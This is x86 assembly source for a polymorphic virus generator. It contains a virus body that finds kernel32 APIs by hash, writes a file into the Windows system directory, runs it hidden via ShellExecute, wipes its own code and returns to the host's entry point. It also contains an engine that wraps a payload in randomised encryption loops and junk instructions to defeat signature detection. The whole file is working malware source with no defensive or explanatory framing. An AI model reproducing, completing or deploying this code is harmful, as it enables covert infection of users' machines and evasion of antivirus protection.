; Polymorphic Virus Generator
; #########################################################################

.data
        TheOpcodes      db      0E8h, 000h, 000h, 000h, 000h
                        db      058h
                        db      08Bh, 0F0h
                        db      08Bh, 0FEh
                        db      0B9h

.code

; Fake proc
VirCodeProc proc
@vir_code_begin::

@code_begin:
        ; Get kernel handle
        assume  fs: nothing
        xor     eax, eax
        mov     edi, fs: dword ptr[eax]
        dec     eax

        mov     ecx, eax
        repnz scasd
        scasd
        mov     ebx, [edi]
        xor     bx, bx

@@:
        cmp     word ptr[ebx], 'ZM'
        jz      @inside_kernel32
        sub     ebx, 10000h
        jmp     @B
@inside_kernel32:

        call    $+5
        pop     ebp
        jmp     @skip_data
@ebp_ptr:
        dd 03b704017h ; CloseHandle             +0
        dd 0453ace16h ; CreateFileA             +4
        dd 077cca384h ; GetSystemDirectoryA     +8
        dd 01db55991h ; WriteFile               +12
        dd 047216310h ; LoadLibraryA            +16
        dd 04fc8d9a2h ; GetProcAddress          +20
        dd 044db6612h ; lstrcatA                +24
        dd 0b5dafe83h ; SetFileAttributesA      +28
        dd 0          ; +32
@add_name_str:        ; +36
        szBglRealNameR
@shell_32_str:
        db "shell32.dll",0
@shell_exec_str:
        db "ShellExecuteA",0
@shell_open:
        db "open",0
@skip_data:
        add     ebp, 3

        ; Get functions
        mov     edx, [ebx+3ch]          ; PE        
        mov     esi, [ebx+edx+78h]      ; Export Table RVA   
        lea     esi, [ebx+esi+18h]      ; Export Table VA+18h
        lodsd
        xchg    eax, ecx                ; NumberOfNames
        lodsd                           ; AddressOfFunctions
        push    eax
        lodsd                           ; AddressOfNames
        add     eax, ebx
        xchg    eax, edx
        lodsd                           ; AddressOfNameOrdinals
        add     eax, ebx
        push    eax

        mov     esi, edx
@next_func:
        lodsd
        add     eax, ebx

        ; Hash
        mov     edx, 0f1e2d3c4h

        push    ebx
@calc_hash:
        mov     ebx, edx
        shl     edx, 5
        shr     ebx, 27
        or      edx, ebx
        movzx   ebx, byte ptr[eax]
        inc     eax
        add     edx, ebx
        test    ebx, ebx
        jnz     @calc_hash
        pop     ebx

        ; Get offset to ordinal
        mov     eax, [esp]              ; AddressOfNameOrdinals
        add     dword ptr[esp], 2       ; Move to next ordinal word

        mov     edi, ebp
@scan_dw_funcs:
        cmp     dword ptr[edi], edx

        .IF     ZERO?
                ; Function found
                movzx   eax, word ptr[eax]      ; Name ordinal
                shl     eax, 2                  ; Multiply by 4
                add     eax, dword ptr[esp+4]
                add     eax, ebx
                mov     eax, dword ptr[eax]
                add     eax, ebx
                stosd
        .ELSE
                ; Skip hash
                scasd
        .ENDIF
        cmp     dword ptr[edi], 0
        jnz     @scan_dw_funcs
        loop    @next_func

        sub     esp, 1026-8
        mov     ebx, esp

        ; GetSystemDirectory
        push    MAX_PATH+1
        push    ebx
        call    dword ptr[ebp+8]

        ; lstrcat
        mov     eax, ebp
        add     eax, @add_name_str-@ebp_ptr
        push    eax
        push    ebx
        call    dword ptr[ebp+24]

        ; Set file attributes
        push    FILE_ATTRIBUTE_NORMAL
        push    ebx
        call    dword ptr[ebp+28]

        ; Create file
        push    0
        push    FILE_ATTRIBUTE_NORMAL
        push    CREATE_ALWAYS
        push    NULL
        push    0
        push    GENERIC_WRITE
        push    ebx
        call    dword ptr[ebp+4]

        mov     edi, eax
        inc     eax
        jz      @cant_create_file

        ; WriteFile
        push    0
        mov     eax, ebp ; Ovewrites CreateFile
        add     eax, 4
        push    eax
        mov     eax, ebp
        add     eax, @f_to_write-@ebp_ptr
        mov     esi, dword ptr[eax]
        push    esi
        add     eax, 4
        push    eax
        push    edi
        call    dword ptr[ebp+12]

        ; CloseHandle
        push    edi
        call    dword ptr[ebp]

        ; Check if entire file was written
        cmp     dword ptr[ebp+4], esi
        jnz     @cant_create_file

        ; Execute file

        ; Load shell32.dll
        mov     eax, ebp
        add     eax, @shell_32_str-@ebp_ptr
        push    eax        
        call    dword ptr[ebp+16]

        ; GetProcAddress(ShellExecuteA)
        mov     edx, ebp
        add     edx, @shell_exec_str-@ebp_ptr
        push    edx
        push    eax
        call    dword ptr[ebp+20]

        ; ShellExecute()
        push    SW_HIDE
        push    NULL
        push    NULL
        push    ebx
        mov     edx, ebp
        add     edx, @shell_exec_str-@shell_open
        push    edx
        push    0
        call    eax

@cant_create_file:
        add     esp, 1026

        ; Erase file data
        mov     eax, ebp
        add     eax, @f_to_write-@ebp_ptr
        mov     ecx, dword ptr[eax]
        add     ecx, 4
        mov     edi, eax
        xor     eax, eax
        rep stosb

        ; Erase virus code
        mov     edi, ebp
        sub     edi, @ebp_ptr-@code_begin
        mov     ecx, @code_end-@code_begin
        xor     eax, eax
        rep stosb
@code_end:
        popf

        ; Jump to OEP
        push    012345678h
        not     dword ptr[esp]
        retn
@f_to_write:
@vir_code_end::
VirCodeProc endp

WriteJunk proc
        invoke  Rand, 2
        .IF     !eax
                ; Jump through junk
                invoke  Rand, 20
                inc     eax
                xor     ecx, ecx
                mov     cl, al
                mov     al, 0ebh
                stosb
                mov     al, cl
                stosb
        @l:
                push    ecx
                invoke  Rand, 250
                stosb
                pop     ecx
                loop    @l
        .ELSE
                ; NOPs
                invoke  Rand, 10
                inc     eax
                mov     ecx, eax
                mov     al, 90h
                rep stosb
        .ENDIF
        ret
WriteJunk endp

MoreJunk proc
        invoke  Rand, 3
        .IF     eax
                mov     ecx, eax
        @l:
                push    ecx
                invoke  WriteJunk
                pop     ecx
                loop    @l
        .ENDIF
        ret
MoreJunk endp

; Returns: eax - pointer, ecx - length
GenVirCode proc uses esi edi ebx lpData, dwDataLen: DWORD
        LOCAL   loop_code_encr[128]: BYTE
        LOCAL   loop_code_decr[128]: BYTE
        LOCAL   loop_len, real_loop_len: DWORD
        LOCAL   nop_count1, nop_count2: DWORD
        LOCAL   rand_add_code: DWORD

        ; Alloc resulting buffer
        mov     eax, dwDataLen
        add     eax, 2048
        invoke  GlobalAlloc, GMEM_FIXED, eax
        mov     edi, eax
        mov     ebx, edi

        ; pushf
        mov     ax, 09C66h
        stosw

        ; Initial junk
        invoke  MoreJunk

        ; Some junk nops inside decrypt loop
        invoke  Rand, 4
        mov     nop_count1, eax
        invoke  Rand, 3
        mov     nop_count2, eax
        invoke  Rand, 8
        .IF     eax == 4
                xor     eax, eax
        .ENDIF
        mov     rand_add_code, eax

        ; Create crypt/decrypt loops
        invoke  Rand, 20
        add     eax, 2
        mov     loop_len, eax
        push    esi
        push    edi

        mov     real_loop_len, 1
        lea     esi, loop_code_encr
        lea     edi, loop_code_decr
        mov     byte ptr[esi], 0ach
        inc     esi
        mov     byte ptr[edi], 0ach
        inc     edi

        add     esi, 120

@l:
        invoke  Rand, 5
        .IF     eax == 0
                ; rol   al, xx
                invoke  Rand, 50
                sub     esi, 3
                mov     word ptr[esi], 0c0c0h
                mov     byte ptr[esi+2], al

                mov     word ptr[edi], 0c8c0h
                mov     byte ptr[edi+2], al
                add     edi, 3

                add     real_loop_len, 3
        .ELSEIF eax == 1
                ; nop
                dec     esi
                mov     byte ptr[esi], 90h
                mov     byte ptr[edi], 90h
                inc     edi

                inc     real_loop_len
        .ELSEIF eax == 2
                ; ror   al, xx
                invoke  Rand, 50
                mov     word ptr[edi], 0c0c0h
                mov     byte ptr[edi+2], al
                add     edi, 3

                sub     esi, 3
                mov     word ptr[esi], 0c8c0h
                mov     byte ptr[esi+2], al

                add     real_loop_len, 3
        .ELSEIF eax == 3
                ; rol   al, cl
                mov     word ptr[edi], 0c0d2h
                add     edi, 2

                sub     esi, 2
                mov     word ptr[esi], 0c8d2h
                add     real_loop_len, 2
        .ELSE
                ; xor   al, xx
                invoke  Rand, 50
                sub     esi, 2
                mov     byte ptr[esi], 34h
                mov     byte ptr[esi+1], al

                mov     byte ptr[edi], 34h
                mov     byte ptr[edi+1], al
                add     edi, 2

                add     real_loop_len, 2
        .ENDIF        
        dec     loop_len
        jnz     @l

        ; Move crypt code to beginning of the array
        push    edi
        lea     edi, loop_code_encr
        inc     edi
        mov     ecx, real_loop_len
        dec     ecx
        rep movsb
        pop     edi

        lea     esi, loop_code_encr
        add     esi, real_loop_len

        mov     byte ptr[esi], 0aah
        inc     esi
        mov     byte ptr[edi], 0aah
        inc     edi

        mov     eax, real_loop_len
        not     eax        
        sub     eax, 2
        mov     byte ptr[esi], 0e2h
        mov     byte ptr[esi+1], al
        mov     byte ptr[esi+2], 0c3h
        mov     byte ptr[edi], 0e2h
        mov     byte ptr[edi+1], al
        mov     byte ptr[edi+2], 0c3h
        pop     edi
        pop     esi

        add     real_loop_len, 3

        ; call  $+5
        mov     esi, offset TheOpcodes
        mov     ecx, 5
        rep movsb

        ; pop   xxx
        xor     eax, eax
        lodsb
        add     eax, rand_add_code
        stosb

        ; nops1
        mov     ecx, nop_count1
        mov     al, 90h
        rep stosb

        ; add   xxx, 999
        mov     ecx, nop_count1
        add     ecx, nop_count2
        add     ecx, real_loop_len
        add     ecx, 13
        mov     al, 83h
        stosb
        mov     eax, 0c0h
        add     eax, rand_add_code
        stosb
        mov     al, cl
        stosb

        ; nops2
        mov     ecx, nop_count2
        mov     al, 90h
        rep stosb

        ; mov   esi, xxx
        movsb
        xor     eax, eax
        lodsb
        add     eax, rand_add_code
        stosb

        ; mov   edi, esi
        movsw

        ; mov   ecx, xxx
        movsb
        mov     eax, dwDataLen
        stosd

        ; Write decryption loop
        lea     esi, loop_code_decr
        mov     ecx, real_loop_len
        rep movsb

        ; Encrypt data
        push    edi
        mov     esi, lpData
        mov     edi, esi
        mov     ecx, dwDataLen
        lea     eax, loop_code_encr
        call    eax

        ; Write data
        mov     esi, lpData
        pop     edi
        mov     ecx, dwDataLen
        rep movsb

        ; Get length of the data to write
        mov     ecx, edi
        sub     ecx, ebx

        mov     eax, ebx
        ret
GenVirCode endp
